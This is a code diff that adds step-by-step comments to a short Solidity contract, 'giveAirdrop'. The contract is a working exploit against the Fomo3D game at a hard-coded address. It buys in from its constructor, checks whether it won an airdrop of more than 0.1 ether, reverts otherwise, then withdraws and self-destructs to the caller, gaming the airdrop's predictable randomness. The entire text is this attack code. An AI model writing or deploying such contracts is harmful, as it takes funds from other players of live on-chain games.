@@ -15,13 +15,13 @@ contract fomo3d {
 contract giveAirdrop {
 
     constructor () public payable {
-        
+        // Instantiate fomo3d contract
         fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
         
-        
+        // Buy in
         require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
         
-        
+        // Check to see if we won an airdrop
         (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
         require(winnings > 0.1 ether);
         fomo.withdraw();
@@ -29,7 +29,7 @@ contract giveAirdrop {
         selfdestruct(msg.sender);
     }
     
-    
+    // Accept ETH
     function () public payable {}
 }
 
